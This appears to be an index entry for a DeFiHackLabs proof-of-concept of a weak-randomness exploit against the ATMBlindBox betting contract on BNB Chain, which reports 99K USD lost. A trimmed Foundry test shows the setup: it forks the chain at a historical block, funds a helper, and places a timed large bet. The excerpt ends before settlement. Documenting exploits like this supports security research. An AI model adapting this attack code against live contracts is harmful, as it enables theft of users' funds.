# [?] ATMBlindBox - Weak Randomness / Predictable RNG

## Summary
Severity: Unknown
Chain: BNB Chain
Component: ATMBlindBox
Published: 2026-03-19
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-03/ATMBlindBox_exp.sol
Type: defi-exploit-poc

## Details
Lost: 99K USD

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    IERC20 private constant atm = IERC20(ATM_TOKEN);
    IBlindBox private constant blindBox = IBlindBox(BLINDBOX);

    function setUp() public {
        uint256 forkBlock = 87_517_071;
        vm.createSelectFork("bsc", forkBlock);
        fundingToken = ATM_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack helper");
        vm.label(BLINDBOX, "ATM BlindBox");
        vm.label(ATM_TOKEN, "ATM");
        vm.label(DEAD, "ATM DEAD payout pool");
    }

    function testExploit() public balanceLog {
        ATMBlindBoxHelper helper = new ATMBlindBoxHelper(ATTACKER);

        // step 1: give the local helper the same large-bet capital as the delayed placement tx.
        uint256 largeBetAmount = 300_000 ether;
        deal(ATM_TOKEN, address(helper), largeBetAmount);
        assertGt(atm.balanceOf(DEAD), (largeBetAmount * 195) / 100, "DEAD payout balance");

        // step 2: place an even-parity large bet in the same block as the historical placement.
        vm.roll(87_517_072);
        vm.warp(1_773_931_227);
        uint256 expectedBetId = blindBox.nextBetId();
        assertEq(expectedBetId, 0x1410, "historical delayed bet id");

        vm.prank(ATTACKER, ATTACKER);
        helper.placeLargeBet(largeBetAmount);

        (, uint256 recordedAmount, uint256 betBlock, uint256 parity, bool settledBefore) = blindBox.bets(expectedBetId);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-03/ATMBlindBox_exp.sol_
